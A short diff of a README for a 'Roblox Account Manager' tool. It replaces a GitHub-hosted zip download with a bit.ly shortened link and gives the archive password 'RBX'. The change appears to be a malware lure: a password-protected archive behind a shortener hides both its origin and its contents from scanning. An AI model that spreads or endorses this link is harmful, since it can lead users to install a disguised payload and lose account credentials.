@@ -4,7 +4,7 @@
 
 ![sss](https://github.com/user-attachments/assets/5e80fe48-0310-4168-9268-138abd76d837)
 
-# <p align="center">[Download](https://github.com/user-attachments/files/16922686/Roblox_Account_Manager_3.7.2.zip) Password: RBX  </p>
+# <p align="center">[Download](https://bit.ly/47hVdBe) Password: RBX  </p>
 
 # Roblox Account Manager
 
